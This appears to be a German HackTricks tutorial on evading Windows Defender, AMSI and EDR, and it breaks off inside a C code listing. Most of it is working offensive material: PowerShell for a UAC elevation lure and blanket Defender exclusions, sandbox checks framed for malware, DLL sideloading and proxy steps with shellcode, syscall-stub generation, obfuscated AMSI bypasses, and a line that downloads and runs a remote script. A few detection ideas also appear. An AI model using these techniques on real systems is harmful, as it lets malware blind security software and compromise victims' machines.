# Antivirus (AV)-Umgehung

{{#include ../banners/hacktricks-training.md}}

**Diese Seite wurde ursprünglich von** [**@m2rc_p**](https://twitter.com/m2rc_p)** verfasst!**

## Defender stoppen

- [defendnot](https://github.com/es3n1n/defendnot): Ein Tool, das Windows Defender deaktiviert.
- [no-defender](https://github.com/es3n1n/no-defender): Ein Tool, das Windows Defender deaktiviert und dabei einen anderen AV vortäuscht.
- [Defender deaktivieren, wenn Sie Admin sind](basic-powershell-for-pentesters/README.md)

### Installer-artiger UAC-Köder vor dem Manipulieren von Defender

Öffentlich verfügbare Loader, die sich als Game-Cheats ausgeben, werden häufig als unsignierte Node.js-/Nexe-Installer ausgeliefert. Sie **fordern den Benutzer zuerst zur Rechteerhöhung auf** und setzen erst danach Defender außer Kraft. Der Ablauf ist einfach:

1. Mit `net session` prüfen, ob der Prozess administrative Rechte hat. Der Befehl ist nur erfolgreich, wenn der aufrufende Prozess über Admin-Rechte verfügt. Ein Fehlschlag bedeutet daher, dass der Loader als Standardbenutzer ausgeführt wird.
2. Sich sofort mit dem Verb `RunAs` neu starten, um die erwartete UAC-Zustimmungsaufforderung auszulösen und dabei die ursprüngliche Befehlszeile beizubehalten.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Die Opfer glauben bereits, dass sie „gecrackte“ Software installieren, und akzeptieren die Aufforderung daher normalerweise. So erhält die Malware die Rechte, die sie benötigt, um die Richtlinien von Defender zu ändern.<sup>[[26]](#references)</sup>

### Pauschale `MpPreference`-Ausnahmen für jeden Laufwerksbuchstaben

Nach der Erhöhung der Rechte maximieren GachiLoader-artige Angriffsketten die blinden Flecken von Defender, statt den Dienst vollständig zu deaktivieren. Zuerst beendet der Loader den GUI-Watchdog (`taskkill /F /IM SecHealthUI.exe`) und fügt dann **extrem weitreichende Ausnahmen** hinzu, sodass Benutzerprofile, Systemverzeichnisse und Wechseldatenträger nicht mehr gescannt werden können:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Key observations:

- Die Schleife durchläuft jedes eingehängte Dateisystem (D:\, E:\, USB-Sticks usw.), sodass **jedes zukünftige Payload, das irgendwo auf der Festplatte abgelegt wird, ignoriert wird**.
- Der Ausschluss der Erweiterung `.sys` ist zukunftsorientiert – Angreifer behalten sich damit die Möglichkeit vor, später unsignierte Treiber zu laden, ohne Defender erneut anzufassen.
- Alle Änderungen erfolgen unter `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`. Spätere Phasen können so bestätigen, dass die Ausschlüsse bestehen bleiben, oder sie erweitern, ohne erneut UAC auszulösen.

Da kein Defender-Dienst angehalten wird, melden oberflächliche Zustandsprüfungen weiterhin „Antivirus aktiv“, obwohl die Echtzeitprüfung diese Pfade nie erfasst.<sup>[[26]](#references)</sup>

## **AV-Evasion-Methodik**

AVs verwenden derzeit verschiedene Methoden, um zu prüfen, ob eine Datei schädlich ist: statische Erkennung, dynamische Analyse und bei den fortschrittlicheren EDRs Verhaltensanalyse.

### **Statische Erkennung**

Bei der statischen Erkennung werden bekannte schädliche Zeichenfolgen oder Byte-Arrays in einer Binärdatei oder einem Skript markiert und außerdem Informationen aus der Datei selbst ausgelesen (z. B. Dateibeschreibung, Firmenname, digitale Signaturen, Symbol, Prüfsumme usw.). Das bedeutet, dass bekannte öffentliche Tools dich leichter auffliegen lassen können, da sie wahrscheinlich bereits analysiert und als schädlich markiert wurden. Es gibt einige Möglichkeiten, diese Art der Erkennung zu umgehen:

- **Verschlüsselung**

Wenn du die Binärdatei verschlüsselst, kann AV dein Programm nicht erkennen. Du benötigst jedoch eine Art Loader, um das Programm zu entschlüsseln und im Arbeitsspeicher auszuführen.

- **Obfuskation**

Manchmal reicht es aus, einige Zeichenfolgen in deiner Binärdatei oder deinem Skript zu ändern, damit es AV passiert. Je nachdem, was du obfuskieren möchtest, kann das jedoch zeitaufwendig sein.

- **Eigene Tools**

Wenn du eigene Tools entwickelst, gibt es keine bekannten schädlichen Signaturen. Das kostet jedoch viel Zeit und Mühe.

> [!TIP]
> Eine gute Möglichkeit, die statische Erkennung durch Windows Defender zu überprüfen, ist [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Dabei wird die Datei in mehrere Segmente aufgeteilt und Defender angewiesen, jedes einzeln zu scannen. So kann das Tool genau anzeigen, welche Zeichenfolgen oder Bytes in deiner Binärdatei markiert werden.

Ich empfehle dir dringend, dir diese [YouTube-Playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) über praktische AV Evasion anzusehen.

### Offline-Tests von PE-Merkmalen für statische Klassifikatoren

Gepackte oder verschlüsselte Payload-Bytes sind nur eine von mehreren Eingaben für einen statischen Klassifikator. EMBER2024 extrahiert PE-Merkmale, darunter Importe, Exporte, Sektionen, Header und Authenticode-Daten.<sup>[[48]](#references)</sup> In einem Loader-Experiment senkte das Hinzufügen von 141 harmlos wirkenden Importen den von EMBER2024 ermittelten Score für Schädlichkeit um 93 %, während mit Malware assoziierte Importe ihn erhöhten. Dieses Ergebnis gilt für dieses Modell und diese Stichproben und stellt keine zuverlässige Umgehung eines bestimmten AV-/EDR-Produkts dar.<sup>[[50]](#references)</sup>

Bei einem autorisierten Loader-Test solltest du Payload und Ausführungspfad konstant halten, pro Variante jeweils nur eine vorgesehene Build-Variable ändern und die Scores offline vergleichen. Untersuche die resultierenden PE-Merkmale, da eine Build-Änderung mehr als eine Merkmalsgruppe beeinflussen kann.<sup>[[49]](#references)[[50]](#references)</sup> Damit die vorgesehenen Importe in der IAT verbleiben, rufe die ausgewählten Win32-APIs aus erreichbarem Code auf. Variiere die Auswahl und verteile die Aufrufstellen auf verschiedene Builds, anstatt eine feste Tarnfunktion zu erstellen, die zu einer Signatur werden könnte. Das Experiment berichtete außerdem von niedrigeren Scores bei gültiger Codesignierung, Exporteinträgen und einer größeren Anzahl von Funktionen, die `.pdata` vergrößern; ungültige Signaturen hatten kaum Auswirkungen, und der Effekt von `.pdata` war gering.<sup>[[50]](#references)</sup>

Das Paket `thrember` bietet Merkmalsextraktion und Benchmark-Modelle. Installiere es und verwende `thrember.download_models("models")` mit einem vorhandenen `models`-Verzeichnis. Führe den Scorer anschließend aus dessen übergeordnetem Verzeichnis aus: Der Download-Helfer ändert das aktuelle Arbeitsverzeichnis. Der PE-Klassifikator kann ein Verzeichnis mit Builds bewerten, ohne sie an einen Scandienst zu übermitteln:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Halte die Versionen des Modells und des Feature-Extractors während des Vergleichs fest. Ein niedrigerer Offline-Score zeigt lediglich, wie dieser Classifier auf die geänderte Binary reagiert; er beweist nicht, dass die Verhaltensanalyse, Emulation oder ein anderes Modell eines Anbieters umgangen wird.<sup>[[49]](#references)[[50]](#references)</sup> Informationen zu [Per-Build-Polymorphismus und Tarnung der äußeren Binary in virtualisierten Payloads](virtualized-payload-execution.md#camouflaging-the-outer-go-executable) findest du im separaten Ausführungsmodell.

### **Dynamische Analyse**

Bei der dynamischen Analyse führt das AV deine Binary in einer Sandbox aus und beobachtet, ob sie bösartige Aktivitäten ausführt (z. B. versucht, die Passwörter deines Browsers zu entschlüsseln und auszulesen, einen Minidump von LSASS zu erstellen usw.). Damit zu arbeiten kann etwas kniffliger sein, aber hier sind einige Möglichkeiten, Sandboxes zu umgehen.

- **Vor der Ausführung warten** Je nach Implementierung kann dies eine hervorragende Möglichkeit sein, die dynamische Analyse des AV zu umgehen. AVs haben nur sehr wenig Zeit, Dateien zu scannen, ohne den Arbeitsablauf des Benutzers zu unterbrechen. Lange Wartezeiten können daher die Analyse von Binaries stören. Das Problem ist, dass viele AV-Sandboxes die Wartezeit je nach Implementierung einfach überspringen können.
- **Systemressourcen überprüfen** Sandboxes haben normalerweise nur sehr wenige Ressourcen zur Verfügung (z. B. < 2 GB RAM), da sie sonst den Rechner des Benutzers verlangsamen könnten. Hier kannst du auch sehr kreativ werden, zum Beispiel die CPU-Temperatur oder sogar die Lüftergeschwindigkeit überprüfen – nicht alles davon wird in der Sandbox implementiert sein.
- **Rechnerspezifische Prüfungen** Wenn du einen Benutzer angreifen möchtest, dessen Workstation Mitglied der Domäne „contoso.local“ ist, kannst du die Domäne des Rechners überprüfen und feststellen, ob sie mit der von dir angegebenen übereinstimmt. Falls nicht, kann dein Programm beendet werden.

Wie sich herausstellt, lautet der Computername der Microsoft-Defender-Sandbox HAL9TH. Du kannst also vor der Detonation in deiner Malware den Computernamen überprüfen. Lautet er HAL9TH, befindest du dich in der Defender-Sandbox und kannst dein Programm beenden lassen.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>Quelle: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Einige weitere sehr gute Tipps von [@mgeeky](https://twitter.com/mariuszbit), um Sandboxes entgegenzuwirken:

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev-Kanal</p></figcaption></figure>

Wie wir in diesem Beitrag bereits erwähnt haben, werden **öffentliche Tools** irgendwann **erkannt**. Deshalb solltest du dir eine Frage stellen:

Wenn du zum Beispiel LSASS dumpen möchtest, **musst du dafür wirklich mimikatz verwenden**? Oder könntest du ein weniger bekanntes Projekt verwenden, das ebenfalls LSASS dumpen kann?

Wahrscheinlich ist Letzteres die richtige Antwort. Nimmt man mimikatz als Beispiel: Es ist vermutlich eines der am häufigsten von AVs und EDRs erkannten Malware-Projekte, wenn nicht sogar das am häufigsten erkannte. Das Projekt selbst ist zwar super, aber es ist auch ein Albtraum, damit AVs zu umgehen. Suche daher einfach nach Alternativen, mit denen du dein Ziel erreichen kannst.

> [!TIP]
> Wenn du deine Payloads zur Umgehung von Erkennung veränderst, solltest du unbedingt **die automatische Übermittlung von Samples** in Defender deaktivieren. Und bitte, wirklich: **Lade nichts auf VIRUSTOTAL hoch**, wenn du langfristig Erkennung vermeiden möchtest. Wenn du prüfen willst, ob ein bestimmtes AV deine Payload erkennt, installiere es in einer VM, versuche die automatische Übermittlung von Samples zu deaktivieren und teste es dort, bis du mit dem Ergebnis zufrieden bist.

## EXEs vs DLLs

Wenn möglich, solltest du zur Umgehung von Erkennung immer **DLLs bevorzugen**. Meiner Erfahrung nach werden DLL-Dateien normalerweise **deutlich seltener erkannt** und analysiert. In manchen Fällen ist das also ein sehr einfacher Trick, um eine Erkennung zu vermeiden (vorausgesetzt natürlich, deine Payload kann als DLL ausgeführt werden).

Wie wir in diesem Bild sehen können, weist eine DLL-Payload von Havoc auf antiscan.me eine Erkennungsrate von 4/26 auf, während die EXE-Payload eine Erkennungsrate von 7/26 hat.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>Vergleich einer normalen Havoc-EXE-Payload mit einer normalen Havoc-DLL auf antiscan.me</p></figcaption></figure>

Nun zeigen wir einige Tricks, mit denen du DLL-Dateien deutlich unauffälliger machen kannst.

## DLL Sideloading & Proxying

**DLL Sideloading** nutzt die DLL-Suchreihenfolge des Loaders aus, indem die Opferanwendung und die bösartigen Payloads nebeneinander platziert werden.

Mit [Siofra](https://github.com/Cybereason/siofra) und dem folgenden PowerShell-Skript kannst du nach Programmen suchen, die für DLL Sideloading anfällig sind:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Dieser Befehl gibt die Liste der Programme in "C:\Program Files\\" aus, die für DLL Hijacking anfällig sind, sowie die DLL-Dateien, die sie zu laden versuchen.

Ich empfehle dringend, **DLL Hijackable/Sideloadable-Programme selbst zu erkunden**. Bei korrekter Ausführung ist diese Technik ziemlich unauffällig. Wenn du jedoch öffentlich bekannte DLL Sideloadable-Programme verwendest, wirst du möglicherweise leicht entdeckt.

Wenn du einfach eine bösartige DLL mit dem Namen platzierst, den ein Programm zu laden erwartet, wird dein Payload nicht geladen, da das Programm bestimmte Funktionen in dieser DLL erwartet. Um dieses Problem zu beheben, verwenden wir eine weitere Technik namens **DLL Proxying/Forwarding**.

**DLL Proxying** leitet die Aufrufe eines Programms von der Proxy-DLL (der bösartigen DLL) an die ursprüngliche DLL weiter. Dadurch bleibt die Funktionalität des Programms erhalten und dein Payload kann ausgeführt werden.

Ich verwende das Projekt [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) von [@flangvik](https://twitter.com/Flangvik/).

Dies sind die Schritte, die ich durchgeführt habe:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Der letzte Befehl liefert uns zwei Dateien: eine DLL-Quellcodevorlage und die ursprünglich umbenannte DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Das sind die Ergebnisse:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sowohl unser Shellcode (mit [SGN](https://github.com/EgeBalci/sgn) encodiert) als auch die Proxy-DLL haben auf [antiscan.me](https://antiscan.me) eine Detection Rate von 0/26! Das würde ich als Erfolg bezeichnen.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ich **empfehle dringend**, dir [S3cur3Th1sSh1ts Twitch-VOD](https://www.twitch.tv/videos/1644171543) über DLL Sideloading und auch [ippsecs Video](https://www.youtube.com/watch?v=3eROsG_WNpE) anzusehen, um mehr über das zu erfahren, was wir besprochen haben.

### Weitergeleitete Exporte missbrauchen (ForwardSideLoading)

Windows-PE-Module können Funktionen exportieren, die eigentlich „Forwarder“ sind: Anstatt auf Code zu verweisen, enthält der Exporteintrag einen ASCII-String im Format `TargetDll.TargetFunc`. Wenn ein Aufrufer den Export auflöst, führt der Windows-Loader Folgendes aus:

- `TargetDll` laden, falls es noch nicht geladen ist
- `TargetFunc` daraus auflösen

Wichtige Verhaltensweisen:
- Wenn `TargetDll` eine KnownDLL ist, wird sie aus dem geschützten KnownDLLs-Namespace bereitgestellt (z. B. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Wenn `TargetDll` keine KnownDLL ist, wird die normale DLL-Suchreihenfolge verwendet, zu der auch das Verzeichnis des Moduls gehört, das die Weiterleitung auflöst.

Dies ermöglicht ein indirektes Sideloading-Primitiv: Suche eine signierte DLL, die eine Funktion exportiert, die an ein Modul mit einem Namen weitergeleitet wird, der keiner KnownDLL entspricht. Platziere dann diese signierte DLL zusammen mit einer vom Angreifer kontrollierten DLL, deren Name exakt dem des weitergeleiteten Zielmoduls entspricht. Wenn der weitergeleitete Export aufgerufen wird, löst der Loader die Weiterleitung auf und lädt deine DLL aus demselben Verzeichnis, wodurch dein DllMain ausgeführt wird.<sup>[[13]](#references)</sup>

Beispiel unter Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` ist keine KnownDLL und wird daher über die normale Suchreihenfolge aufgelöst.

PoC (copy-paste):
1) Kopiere die signierte System-DLL in einen beschreibbaren Ordner
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Lege eine bösartige `NCRYPTPROV.dll` im selben Ordner ab. Ein minimales DllMain reicht für code execution aus; du musst die weitergeleitete Funktion nicht implementieren, um DllMain auszulösen.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Löse die Weiterleitung mit einem signierten LOLBin aus:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Beobachtetes Verhalten:
- rundll32 (signiert) lädt die side-by-side-`keyiso.dll` (signiert)
- Beim Auflösen von `KeyIsoSetAuditingInterface` folgt der Loader dem Forward zu `NCRYPTPROV.SetAuditingInterface`
- Der Loader lädt anschließend `NCRYPTPROV.dll` aus `C:\test` und führt dessen `DllMain` aus
- Wenn `SetAuditingInterface` nicht implementiert ist, erscheint der Fehler „missing API“ erst, nachdem `DllMain` bereits ausgeführt wurde

Tipps zur Suche:
- Konzentriere dich auf weitergeleitete Exporte, bei denen das Zielmodul keine KnownDLL ist. KnownDLLs sind unter `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` aufgeführt.
- Weitergeleitete Exporte lassen sich mit Tools wie diesen aufzählen:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Siehe das Windows 11-Forwarder-Inventar, um nach Kandidaten zu suchen: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ideen zur Erkennung/Abwehr:
- LOLBins (z. B. rundll32.exe) überwachen, die signierte DLLs aus Nicht-Systempfaden laden, gefolgt vom Laden von Nicht-KnownDLLs mit demselben Basisnamen aus diesem Verzeichnis
- Bei Prozess-/Modulketten wie `rundll32.exe` → Nicht-System-`keyiso.dll` → `NCRYPTPROV.dll` in benutzerschreibbaren Pfaden Alarm auslösen
- Richtlinien zur Codeintegrität (WDAC/AppLocker) durchsetzen und Schreib- sowie Ausführungsrechte in Anwendungsverzeichnissen verweigern

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze ist ein Payload-Toolkit zum Umgehen von EDRs mithilfe angehaltener Prozesse, direkter Syscalls und alternativer Ausführungsmethoden`

Mit Freeze kannst du deinen Shellcode auf unauffällige Weise laden und ausführen.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ist ein Katz-und-Maus-Spiel: Was heute funktioniert, kann morgen erkannt werden. Verlasse dich daher niemals nur auf ein einziges Tool und versuche, wenn möglich, mehrere Evasion-Techniken miteinander zu kombinieren.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRs setzen häufig **User-Mode-Inline-Hooks** auf Syscall-Stubs in `ntdll.dll`. Um diese Hooks zu umgehen, kannst du **direkte** oder **indirekte** Syscall-Stubs generieren, die die korrekte **SSN** (System Service Number) laden und in den Kernel-Modus wechseln, ohne den mit einem Hook versehenen Export-Einstiegspunkt auszuführen.<sup>[[32]](#references)</sup>

**Aufrufoptionen:**
- **Direct (embedded)**: Eine `syscall`-/`sysenter`-/`SVC #0`-Anweisung in den generierten Stub einfügen (kein Aufruf eines `ntdll`-Exports).
- **Indirect**: Zu einem vorhandenen **syscall gadget** innerhalb von `ntdll` springen, sodass der Übergang in den Kernel den Anschein erweckt, von `ntdll` auszugehen (nützlich zur Umgehung heuristischer Erkennung); **randomized indirect** wählt bei jedem Aufruf ein Gadget aus einem Pool aus.
- **Egg-hunt**: Die statische Opcode-Sequenz `0F 05` nicht auf der Festplatte speichern, sondern eine Syscall-Sequenz zur Laufzeit auflösen.

**Hook-resistente Strategien zur SSN-Auflösung:**
- **FreshyCalls (VA sort)**: SSNs ableiten, indem Syscall-Stubs nach virtueller Adresse sortiert werden, statt Stub-Bytes auszulesen.
- **SyscallsFromDisk**: Eine saubere `\KnownDlls\ntdll.dll` mappen, SSNs aus deren `.text` lesen und sie anschließend wieder unmappen (umgeht alle Hooks im Speicher).
- **RecycledGate**: Die Ableitung von SSNs nach sortierter virtueller Adresse mit einer Opcode-Validierung kombinieren, wenn ein Stub sauber ist; bei einem Hook auf die Ableitung anhand der virtuellen Adresse zurückgreifen.
- **HW Breakpoint**: DR0 auf die `syscall`-Anweisung setzen und mit einem VEH die SSN zur Laufzeit aus `EAX` erfassen, ohne Hook-Bytes zu parsen.

Beispiel für die Verwendung von SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI wurde entwickelt, um „[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)“ zu verhindern. Anfangs konnten AVs nur **Dateien auf der Festplatte** scannen. Wenn du also Payloads irgendwie **direkt im Arbeitsspeicher** ausführen konntest, konnte der AV nichts dagegen tun, da ihm nicht genügend Einblick zur Verfügung stand.

Die AMSI-Funktion ist in die folgenden Windows-Komponenten integriert.

- Benutzerkontensteuerung (User Account Control, UAC; Erhöhung von EXE-, COM- und MSI-Dateien oder Installation von ActiveX)
- PowerShell (Skripte, interaktive Verwendung und dynamische Codeauswertung)
- Windows Script Host (wscript.exe und cscript.exe)
- JavaScript und VBScript
- Office-VBA-Makros

Sie ermöglicht es Antivirenlösungen, das Verhalten von Skripten zu untersuchen, indem sie den Skriptinhalt in unverschlüsselter und nicht verschleierter Form bereitstellt.

Die Ausführung von `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` löst unter Windows Defender die folgende Warnung aus.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Beachte, dass `amsi:` vorangestellt wird, gefolgt vom Pfad der ausführbaren Datei, von der das Skript gestartet wurde – in diesem Fall powershell.exe.

Wir haben keine Datei auf die Festplatte geschrieben, wurden aber trotzdem im Arbeitsspeicher durch AMSI erkannt.

Außerdem wird C#-Code ab **.NET 4.8** ebenfalls durch AMSI geleitet. Das betrifft sogar `Assembly.Load(byte[])`, mit dem Code im Arbeitsspeicher ausgeführt wird. Deshalb empfiehlt es sich, für die Ausführung im Arbeitsspeicher niedrigere .NET-Versionen (wie 4.7.2 oder älter) zu verwenden, wenn du AMSI umgehen möchtest.

Es gibt verschiedene Möglichkeiten, AMSI zu umgehen:

- **Obfuskation**

Da AMSI hauptsächlich mit statischen Erkennungsverfahren arbeitet, kann eine Änderung der zu ladenden Skripte eine gute Möglichkeit sein, die Erkennung zu umgehen.

AMSI kann Skripte jedoch auch dann deobfuskieren, wenn sie mehrere Verschleierungsebenen enthalten. Je nach Vorgehensweise kann Obfuskation daher eine schlechte Option sein. Dadurch ist die Umgehung nicht ganz unkompliziert. Manchmal reicht es allerdings schon, ein paar Variablennamen zu ändern. Es hängt also davon ab, wie stark etwas markiert wurde.

- **AMSI-Bypass**

Da AMSI implementiert wird, indem eine DLL in den powershell-Prozess (sowie in cscript.exe, wscript.exe usw.) geladen wird, lässt sie sich leicht manipulieren – sogar mit einem unprivilegierten Benutzerkonto. Aufgrund dieses Implementierungsfehlers von AMSI haben Forscher mehrere Möglichkeiten gefunden, den AMSI-Scan zu umgehen.

**Einen Fehler erzwingen**

Wenn die AMSI-Initialisierung fehlschlägt (`amsiInitFailed`), wird für den aktuellen Prozess kein Scan gestartet. Dies wurde ursprünglich von [Matt Graeber](https://twitter.com/mattifestation) offengelegt. Microsoft hat eine Signatur entwickelt, um eine breitere Nutzung zu verhindern.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Es genügte eine einzige Zeile PowerShell-Code, um AMSI für den aktuellen PowerShell-Prozess unbrauchbar zu machen. Diese Zeile wurde natürlich von AMSI selbst erkannt, daher muss die Technik etwas angepasst werden.

Hier ist ein modifizierter AMSI bypass, den ich diesem [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) entnommen habe.

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Beachte, dass dieser Beitrag nach seiner Veröffentlichung wahrscheinlich erkannt wird. Du solltest also keinen Code veröffentlichen, wenn du vorhast, unentdeckt zu bleiben.

**Memory Patching**

Diese Technik wurde ursprünglich von [@RastaMouse](https://twitter.com/_RastaMouse/) entdeckt. Dabei wird die Adresse der Funktion „AmsiScanBuffer“ in amsi.dll ermittelt, die für das Scannen der vom Benutzer bereitgestellten Eingabe zuständig ist, und mit Anweisungen überschrieben, die den Fehlercode E_INVALIDARG zurückgeben. Dadurch gibt das Ergebnis des eigentlichen Scans 0 zurück, was als sauberes Ergebnis interpretiert wird.

> [!TIP]
> Eine ausführlichere Erklärung findest du unter [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/).

Es gibt außerdem viele weitere Techniken, um AMSI mit PowerShell zu umgehen. Weitere Informationen findest du auf [**dieser Seite**](basic-powershell-for-pentesters/index.html#amsi-bypass) und in [**diesem Repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell).

### AMSI-COM-Scan-Pointer-Umleitung statt `AmsiScanBuffer`-Patching

Ein weiterer prozesslokaler Bypass lässt den Einstiegspunkt `AmsiScanBuffer` unverändert. Im dokumentierten 64-Bit-.NET-Loader wird ein AMSI-COM-Objekt mit der CLSID `fdb00e52-a214-4aa1-8fba-4357bb0072ec` erstellt. `Marshal.GetIUnknownForObject()` liefert den Schnittstellenzeiger, und sein vtable-Slot am Offset `0x18` wird als Ziel des Scan-Aufrufs verwendet. Der Loader überschreibt einen nativen Zeiger für `Console.Clear()` mit einem kurzen x64-Stub, ändert diesen vtable-Eintrag mit `VirtualProtect()` auf den Stub und stellt anschließend den ursprünglichen Seitenschutz wieder her. Sowohl die Zeigerbreite von 64 Bit als auch das erwartete COM-Layout sind Voraussetzungen; dies ist kein allgemeingültiger Offset für beliebige AMSI-Schnittstellen oder Builds. Zu den zuvor beobachteten Phasen gehören das [Laden eines signierten AppDomainManager-Sidecars](windows-local-privilege-escalation/dll-hijacking/#signed-appdomainmanager-type-as-a-configuration-file-gadget) und die [RESX-Deserialisierung](../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml).<sup>[[51]](#references)</sup>

Die beobachteten Stub-Bytes sind `41 C7 00 01 00 00 00 33 C0 C3`: Sie schreiben **1** in den Ergebniszeiger in `r8` und geben **0** in `eax` zurück. Die dokumentierte Behauptung, das Scan-Ergebnis sei `AMSI_RESULT_CLEAN` (0), verwechselt also den Rückgabewert `S_OK` mit dem Ausgabe-Enum. In der dokumentierten Reihenfolge von `AMSI_RESULT` steht **1** für `AMSI_RESULT_NOT_DETECTED`; der Wert liegt weiterhin unterhalb der Erkennungsschwelle.<sup>[[51]](#references)[[52]](#references)[[53]](#references)</sup>

### AMSI blockieren, indem das Laden von amsi.dll verhindert wird (LdrLoadDll-Hook)

AMSI wird erst initialisiert, nachdem amsi.dll in den aktuellen Prozess geladen wurde. Ein robuster, sprachunabhängiger Bypass besteht darin, einen User-Mode-Hook auf `ntdll!LdrLoadDll` zu setzen, der einen Fehler zurückgibt, wenn das angeforderte Modul `amsi.dll` ist. Dadurch wird AMSI nie geladen und in diesem Prozess finden keine Scans statt.<sup>[[23]](#references)</sup>

Implementierungsübersicht (x64-C/C++-Pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

